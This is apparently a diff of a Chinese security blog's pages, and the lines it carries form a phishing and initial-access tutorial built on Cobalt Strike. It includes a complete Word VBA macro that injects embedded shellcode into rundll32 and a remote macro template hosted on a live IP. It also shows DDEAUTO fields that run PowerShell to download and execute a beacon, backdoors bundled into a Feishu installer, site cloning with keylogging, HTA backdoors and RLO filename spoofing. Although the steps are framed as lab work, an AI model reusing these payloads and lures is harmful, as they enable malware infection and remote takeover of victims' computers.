+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021528960.png" alt="image-20231002152833900"></p>
 <p>放到靶机上打开 CHM 帮助文档然后点击即可在 Cobalt Strike 上线（实战伪装的像一点 <a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42131443/article/details/112719415">https://blog.csdn.net/weixin_42131443/article/details/112719415</a></p>
 <p>点击上线</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021528719.png" alt="image-20231002152847666"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021529439.png" alt="image-20231002152905375"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021528719.png" alt="image-20231002152847666"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021529439.png" alt="image-20231002152905375"></p>
 <h2 id="压缩文件自解压上线"><a href="#压缩文件自解压上线" class="headerlink" title="压缩文件自解压上线"></a>压缩文件自解压上线</h2><p>Cobalt Strike 生成 exe 可执行程序后门</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021529159.png" alt="image-20231002152924115"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021529262.png" alt="image-20231002152937217"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021529159.png" alt="image-20231002152924115"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021529262.png" alt="image-20231002152937217"></p>
 <p>把生成的 exe 后门和正常的 exe 文件自定义压缩（选中，添加到压缩文件），把两个文件选中后点击添加到压缩文件，然后点击创建自解压格式压缩文件</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021529737.png" alt="image-20231002152949685"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021529737.png" alt="image-20231002152949685"></p>
 <p>点击 高级-&gt;自解压选项</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021530075.png" alt="image-20231002153000024"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021530075.png" alt="image-20231002153000024"></p>
 <p>设置解压路径为 C:\Users\yb\Desktop\钓鱼</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021530791.png" alt="image-20231002153013744"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021530791.png" alt="image-20231002153013744"></p>
 <p>添加解压后运行的程序</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\yb\Desktop\钓鱼\artifact.exe</span><br><span class="line">C:\Users\yb\Desktop\钓鱼\Feishu-win32_ia32-5.28.7-signed.exe</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021530171.png" alt="image-20231002153056120"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021530171.png" alt="image-20231002153056120"></p>
 <p>设置 模式-&gt; 静默模式-&gt; 全部隐藏</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021531995.png" alt="image-20231002153110953"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021531995.png" alt="image-20231002153110953"></p>
 <p>设置 更新模式为解压并更新文件 和 覆盖模式为 覆盖所有文件</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021531042.png" alt="image-20231002153122001"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021531042.png" alt="image-20231002153122001"></p>
 <p>最后设置压缩文件名进行压缩</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021531634.png" alt="image-20231002153134581"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021531634.png" alt="image-20231002153134581"></p>
 <p>在靶机上执行压缩出来的 exe 文件，此时飞书的安装程序会正常进行，而后门程序也悄悄启动</p>
 <p>这个图标看起来有点假，改一下，工具：<code>ResourceHacker</code></p>
 <p>图片转换为ico格式：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bitbug.net/</span><br></pre></td></tr></table></figure>
 
 <h2 id="捆绑文件上线"><a href="#捆绑文件上线" class="headerlink" title="捆绑文件上线"></a>捆绑文件上线</h2><p>用 <code>超级文件捆绑（免杀增强版）.zp.exe</code> 可以把两个 exe 程序绑定在一起，启动一个 exe 程序就会启动另一个 exe 程序</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021532666.png" alt="image-20231002153243623"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021532666.png" alt="image-20231002153243623"></p>
 <p>把捆绑生成的 exe 文件放到靶机上执行，Cobalt Strike 会获取到目标 shell。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021532163.png" alt="image-20231002153256116"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021532163.png" alt="image-20231002153256116"></p>
 <h2 id="Word上线宏语言编写的后门"><a href="#Word上线宏语言编写的后门" class="headerlink" title="Word上线宏语言编写的后门"></a>Word上线宏语言编写的后门</h2><h3 id="word"><a href="#word" class="headerlink" title="word"></a>word</h3><p>Cobalt Strike 生成宏语言编写的后门</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021533592.png" alt="image-20231002153307549"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021533752.png" alt="image-20231002153317713"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021533592.png" alt="image-20231002153307549"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021533752.png" alt="image-20231002153317713"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">Private Type PROCESS_INFORMATION</span><br><span class="line">    hProcess As Long</span><br><span class="line">    hThread As Long</span><br><span class="line">    dwProcessId As Long</span><br><span class="line">    dwThreadId As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">Private Type STARTUPINFO</span><br><span class="line">    cb As Long</span><br><span class="line">    lpReserved As String</span><br><span class="line">    lpDesktop As String</span><br><span class="line">    lpTitle As String</span><br><span class="line">    dwX As Long</span><br><span class="line">    dwY As Long</span><br><span class="line">    dwXSize As Long</span><br><span class="line">    dwYSize As Long</span><br><span class="line">    dwXCountChars As Long</span><br><span class="line">    dwYCountChars As Long</span><br><span class="line">    dwFillAttribute As Long</span><br><span class="line">    dwFlags As Long</span><br><span class="line">    wShowWindow As Integer</span><br><span class="line">    cbReserved2 As Integer</span><br><span class="line">    lpReserved2 As Long</span><br><span class="line">    hStdInput As Long</span><br><span class="line">    hStdOutput As Long</span><br><span class="line">    hStdError As Long</span><br><span class="line">End Type</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Private Declare PtrSafe Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As LongPtr, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As LongPtr, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As LongPtr) As LongPtr</span><br><span class="line">    Private Declare PtrSafe Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDirectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#Else</span><br><span class="line">    Private Declare Function CreateStuff Lib &quot;kernel32&quot; Alias &quot;CreateRemoteThread&quot; (ByVal hProcess As Long, ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, lpParameter As Long, ByVal dwCreationFlags As Long, lpThreadID As Long) As Long</span><br><span class="line">    Private Declare Function AllocStuff Lib &quot;kernel32&quot; Alias &quot;VirtualAllocEx&quot; (ByVal hProcess As Long, ByVal lpAddr As Long, ByVal lSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long</span><br><span class="line">    Private Declare Function WriteStuff Lib &quot;kernel32&quot; Alias &quot;WriteProcessMemory&quot; (ByVal hProcess As Long, ByVal lDest As Long, ByRef Source As Any, ByVal Length As Long, ByVal LengthWrote As Long) As Long</span><br><span class="line">    Private Declare Function RunStuff Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long</span><br><span class="line">#End If</span><br><span class="line"></span><br><span class="line">Sub Auto_Open()</span><br><span class="line">    Dim myByte As Long, myArray As Variant, offset As Long</span><br><span class="line">    Dim pInfo As PROCESS_INFORMATION</span><br><span class="line">    Dim sInfo As STARTUPINFO</span><br><span class="line">    Dim sNull As String</span><br><span class="line">    Dim sProc As String</span><br><span class="line"></span><br><span class="line">#If VBA7 Then</span><br><span class="line">    Dim rwxpage As LongPtr, res As LongPtr</span><br><span class="line">#Else</span><br><span class="line">    Dim rwxpage As Long, res As Long</span><br><span class="line">#End If</span><br><span class="line">    myArray = Array(-4,-24,-119,0,0,0,96,-119,-27,49,-46,100,-117,82,48,-117,82,12,-117,82,20,-117,114,40,15,-73,74,38,49,-1,49,-64,-84,60,97,124,2,44,32,-63,-49, _</span><br><span class="line">13,1,-57,-30,-16,82,87,-117,82,16,-117,66,60,1,-48,-117,64,120,-123,-64,116,74,1,-48,80,-117,72,24,-117,88,32,1,-45,-29,60,73,-117,52,-117,1, _</span><br><span class="line">-42,49,-1,49,-64,-84,-63,-49,13,1,-57,56,-32,117,-12,3,125,-8,59,125,36,117,-30,88,-117,88,36,1,-45,102,-117,12,75,-117,88,28,1,-45,-117,4, _</span><br><span class="line">-117,1,-48,-119,68,36,36,91,91,97,89,90,81,-1,-32,88,95,90,-117,18,-21,-122,93,104,110,101,116,0,104,119,105,110,105,84,104,76,119,38,7,-1, _</span><br><span class="line">-43,49,-1,87,87,87,87,87,104,58,86,121,-89,-1,-43,-23,-124,0,0,0,91,49,-55,81,81,106,3,81,81,104,80,0,0,0,83,80,104,87,-119,-97, _</span><br><span class="line">-58,-1,-43,-21,112,91,49,-46,82,104,0,2,64,-124,82,82,82,83,82,80,104,-21,85,46,59,-1,-43,-119,-58,-125,-61,80,49,-1,87,87,106,-1,83,86, _</span><br><span class="line">104,45,6,24,123,-1,-43,-123,-64,15,-124,-61,1,0,0,49,-1,-123,-10,116,4,-119,-7,-21,9,104,-86,-59,-30,93,-1,-43,-119,-63,104,69,33,94,49,-1, _</span><br><span class="line">-43,49,-1,87,106,7,81,86,80,104,-73,87,-32,11,-1,-43,-65,0,47,0,0,57,-57,116,-73,49,-1,-23,-111,1,0,0,-23,-55,1,0,0,-24,-117,-1, _</span><br><span class="line">-1,-1,47,78,98,119,53,0,17,-116,127,123,-80,105,69,14,82,-44,122,-27,-53,42,104,60,-120,-108,98,52,-62,95,-18,-112,16,111,20,3,-63,71,-7,118, _</span><br><span class="line">-3,-22,-113,-31,-125,-89,-52,25,40,-126,37,-56,35,-42,-31,-114,-111,68,-116,68,8,87,-118,-94,-88,108,38,84,9,33,50,126,64,75,-38,65,-84,-107,-125,11, _</span><br><span class="line">-27,0,85,115,101,114,45,65,103,101,110,116,58,32,77,111,122,105,108,108,97,47,52,46,48,32,40,99,111,109,112,97,116,105,98,108,101,59,32,77, _</span><br><span class="line">83,73,69,32,55,46,48,59,32,87,105,110,100,111,119,115,32,78,84,32,53,46,49,59,32,83,86,49,59,32,46,78,69,84,32,67,76,82,32,50, _</span><br><span class="line">46,48,46,53,48,55,50,55,41,13,10,0,-6,-89,42,91,59,-3,-74,-45,-22,-76,49,37,-71,-60,-58,-82,-103,-18,21,-74,78,117,-3,-116,107,114,-34,-97, _</span><br><span class="line">-10,45,42,10,-96,63,86,66,49,-94,88,-116,-29,-60,53,-85,40,-96,103,-106,10,36,-104,-4,48,35,60,-69,126,14,38,66,22,-43,82,99,-66,74,-59,32, _</span><br><span class="line">-88,3,97,-80,-22,21,26,52,0,-38,5,75,12,-64,-118,72,-97,-32,-76,9,103,34,-8,45,-78,-103,125,-63,123,5,-40,66,-122,22,-80,-81,-71,-86,-24,2, _</span><br><span class="line">27,66,76,-93,-28,126,-5,-15,51,106,19,-37,33,122,31,-9,49,-71,-93,-17,-67,112,-12,-18,53,11,-93,20,-97,-82,-17,15,-97,-57,60,74,-74,81,-106,-101, _</span><br><span class="line">-71,13,71,-39,-126,81,-88,-84,71,109,-71,-25,-28,-58,72,4,-8,-13,81,9,-95,-118,-94,29,-48,-34,34,-106,-41,-13,-111,18,24,72,-121,53,34,12,-26,-38, _</span><br><span class="line">-117,-58,100,-76,8,46,-67,41,52,-14,-102,-7,103,91,-7,-22,-86,-123,71,-116,-53,93,100,101,-57,0,104,-16,-75,-94,86,-1,-43,106,64,104,0,16,0,0, _</span><br><span class="line">104,0,0,64,0,87,104,88,-92,83,-27,-1,-43,-109,-71,0,0,0,0,1,-39,81,83,-119,-25,87,104,0,32,0,0,83,86,104,18,-106,-119,-30,-1,-43, _</span><br><span class="line">-123,-64,116,-58,-117,7,1,-61,-123,-64,117,-27,88,-61,-24,-87,-3,-1,-1,49,57,50,46,49,54,56,46,49,51,55,46,49,51,49,0,18,52,86,120)</span><br><span class="line">    If Len(Environ(&quot;ProgramW6432&quot;)) &gt; 0 Then</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\SysWOW64\\rundll32.exe&quot;</span><br><span class="line">    Else</span><br><span class="line">        sProc = Environ(&quot;windir&quot;) &amp; &quot;\\System32\\rundll32.exe&quot;</span><br><span class="line">    End If</span><br><span class="line"></span><br><span class="line">    res = RunStuff(sNull, sProc, ByVal 0&amp;, ByVal 0&amp;, ByVal 1&amp;, ByVal 4&amp;, ByVal 0&amp;, sNull, sInfo, pInfo)</span><br><span class="line"></span><br><span class="line">    rwxpage = AllocStuff(pInfo.hProcess, 0, UBound(myArray), &amp;H1000, &amp;H40)</span><br><span class="line">    For offset = LBound(myArray) To UBound(myArray)</span><br><span class="line">        myByte = myArray(offset)</span><br><span class="line">        res = WriteStuff(pInfo.hProcess, rwxpage + offset, myByte, 1, ByVal 0&amp;)</span><br><span class="line">    Next offset</span><br><span class="line">    res = CreateStuff(pInfo.hProcess, 0, 0, rwxpage, 0, 0, 0)</span><br><span class="line">End Sub</span><br><span class="line">Sub AutoOpen()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">    Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
 
 <p>新建一个 word 文档，开启开发工具（文件-&gt;选项-&gt;自定义功能区-&gt;开发工具）</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021534695.png" alt="image-20231002153409633"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021534695.png" alt="image-20231002153409633"></p>
 <p>开发工具-&gt;Visual Basic</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021534159.png" alt="image-20231002153427111"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021534159.png" alt="image-20231002153427111"></p>
 <p>把上面生成的宏语言后门粘贴进去</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021534288.png" alt="image-20231002153447217"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021534288.png" alt="image-20231002153447217"></p>
 <p>保存时点击对话框的“否”</p>
 <p>另存为Word 97-2003 文档格式，保证低版本word可以打开</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535215.png" alt="image-20231002153505159"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535215.png" alt="image-20231002153505159"></p>
 <p>用word打开，靶机上线</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535883.png" alt="image-20231002153516828"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535883.png" alt="image-20231002153516828"></p>
 <h3 id="注入远程恶意word模板"><a href="#注入远程恶意word模板" class="headerlink" title="注入远程恶意word模板"></a>注入远程恶意word模板</h3><p>可以把恶意的word文件放到自己的vps上，然后通过word可以加载网络上的word模板的功能加载vps上的word文件，达到绕过一部分杀软的检测，因为靶机上的word文件的确是人畜无害的。</p>
 <p>按前面正常的word钓鱼步骤，在另存时保存为dotm格式即启用宏的word模板</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535882.png" alt="image-20231002153530839"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535882.png" alt="image-20231002153530839"></p>
 <p>放到vps上，用 python3 -m http.server 8080 （python2: python -m SimpleHTTPServer 8080）开启简易web服务，确保靶机上用 <a target="_blank" rel="noopener" href="http://vpsip:8080/dy.dotm">http://vpsip:8080/dy.dotm</a> 能访问到</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535953.png" alt="image-20231002153541884"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535953.png" alt="image-20231002153541884"></p>
 <p>打开word，加载模板创建一个word文件</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021535540.png" alt="image-20231002153558479"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021535540.png" alt="image-20231002153558479"></p>
 <p>保存为docx格式，然后把生成的word文件后缀改为zip格式然后解压得到如下目录</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021536076.png" alt="image-20231002153609039"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021536076.png" alt="image-20231002153609039"></p>
 <p>打开 word&#x2F;_rels&#x2F;settings.xml.rels 文件，把Target字段内容改为dotm文件对应ur</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;http://49.0.251.11:8080/1.dotm&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt;</span><br></pre></td></tr></table></figure>
 
@@ -1994,21 +1994,21 @@
 
 <p>生成 poc.doc 放到靶机上执行，靶机弹出计算机，可以把 calc 换成 powershell 下载后门命令</p>
 <h3 id="word插入外部对象上线"><a href="#word插入外部对象上线" class="headerlink" title="word插入外部对象上线"></a>word插入外部对象上线</h3><p>插入-&gt;对象</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021536951.png" alt="image-20231002153629908"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021536951.png" alt="image-20231002153629908"></p>
 <p>插入 Cobalt Strike 生成的 exe 后门文件，然后显示为图标，更改图标，改个题注，可以把图标也换一下</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539742.png" alt="image-20231002153900683"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539742.png" alt="image-20231002153900683"></p>
 <p>在word里面多出来这个</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539591.png" alt="image-20231002153913543"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539591.png" alt="image-20231002153913543"></p>
 <p>点击后，靶机上线</p>
 <h3 id="word文档构造DDE"><a href="#word文档构造DDE" class="headerlink" title="word文档构造DDE"></a>word文档构造DDE</h3><p>创建一个docx文档，然后快捷键 Ctrl+f9 快速创建一个域，在花括号填入如下指令</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO c:\\windows\\system32\\cmd.exe &quot;\/k calc.exe&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539722.png" alt="image-20231002153925686"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539722.png" alt="image-20231002153925686"></p>
 <p>放到靶机上执行，靶机会弹出计算机，可以把计算机换成其它上线命令</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539528.png" alt="image-20231002153935490"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539528.png" alt="image-20231002153935490"></p>
 <p>比如用powershell上线，先生成木马</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539885.png" alt="image-20231002153944840"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021539744.png" alt="image-20231002153957698"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539885.png" alt="image-20231002153944840"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021539744.png" alt="image-20231002153957698"></p>
 <p>在保存木马的地方用 python -m http.server 8080 开启简易web服务</p>
 <p>{}内写如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DDEAUTO &quot;C:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP</span><br><span class="line">-sta -NonI -W Hidden IEX (New-Object</span><br><span class="line">System.Net.WebClient).DownloadString(&#x27;http://192.168.137.1:8080/beacon.exe&#x27;)</span><br><span class="line">; # &quot; &quot;Microsoft Document Security Add-On&quot;</span><br></pre></td></tr></table></figure>
@@ -2031,9 +2031,9 @@
 <h2 id="克隆网站钓鱼"><a href="#克隆网站钓鱼" class="headerlink" title="克隆网站钓鱼"></a>克隆网站钓鱼</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42516903/article/details/112398825">https://blog.csdn.net/weixin_42516903/article/details/112398825</a></p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/ITmincherry/article/details/105716951">https://blog.csdn.net/ITmincherry/article/details/105716951</a></p>
 <p>工具包：<a target="_blank" rel="noopener" href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021540008.png" alt="image-20231002154012952"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021540008.png" alt="image-20231002154012952"></p>
 <p>注意端口不要冲突，把键盘记录打开</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021540146.png" alt="image-20231002154030095"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021540146.png" alt="image-20231002154030095"></p>
 <p>我这里直接克隆会报错，可以使用其他工具克隆，然后放在本地，在克隆本地即可</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例如：wget -r -p -np -k https://www.baidu.com</span><br></pre></td></tr></table></figure>
 
@@ -2044,15 +2044,15 @@
 <h2 id="HTML-Application"><a href="#HTML-Application" class="headerlink" title="HTML Application"></a>HTML Application</h2><p>准确的说 HTML Application 并不是一个后门上线方式，而是其本身就是一个后门程序，只是其文件后缀为 hta 比较隐蔽所以放到这里了。</p>
 <p>将 HTML 保存为 .hta 后缀即可生成 HTML Application 程序，HTML Application 可以用 vbscript 或者 jscript 编写，可以编写一个 HTML Application 程序后门，目标执行了就会被获取 shell。（Cobalt Strike 生成的 HTML Application 程序后门是用 vbscript 编写的）</p>
 <p>Cobalt Strike 生成 HTML Application 类型后门</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021540806.png" alt="image-20231002154041759"></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021540082.png" alt="image-20231002154052040"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021540806.png" alt="image-20231002154041759"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021540082.png" alt="image-20231002154052040"></p>
 <p>方法选择 powershell 类型，这样生成的 HTML Application 程序是以 powershell 执行命令的，也就是 HTML Application 调用 powershell</p>
 <p>放到靶机上执行后门文件， Cobalt Strike 即可获取到 shell</p>
 <h2 id="一些隐藏小技巧"><a href="#一些隐藏小技巧" class="headerlink" title="一些隐藏小技巧"></a>一些隐藏小技巧</h2><h3 id="文件名反转"><a href="#文件名反转" class="headerlink" title="文件名反转"></a>文件名反转</h3><p>在文件名中插入 RLO unicode 字符，可以反转文件名，比如把前面 HTML Application 程序后门进行文件名反转</p>
 <p>先改个名字，<code>shelltxt.hta</code>，选中shell后面，txt前面</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021541661.png" alt="image-20231002154104598"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021541661.png" alt="image-20231002154104598"></p>
 <p>文件名反转</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021541355.png" alt="image-20231002154116326"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021541355.png" alt="image-20231002154116326"></p>
 <h3 id="更改图标"><a href="#更改图标" class="headerlink" title="更改图标"></a>更改图标</h3><p>工具：ResourceHacker</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/jj0219/p/11398356.html">https://www.cnblogs.com/jj0219/p/11398356.html</a></p>
 <p>参考：</p>
@@ -2423,7 +2423,7 @@
 
 <p>这里将xx替换为x</p>
 <p>正常传入 <strong>?name&#x3D;aaa&amp;age&#x3D;18</strong></p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021405597.png" alt="image-20231002125445067"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021405597.png" alt="image-20231002125445067"></p>
 <p>构造：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=18&quot;;s:3:&quot;age&quot;;s:6:&quot;whoami&quot;;&#125;</span><br></pre></td></tr></table></figure>
 
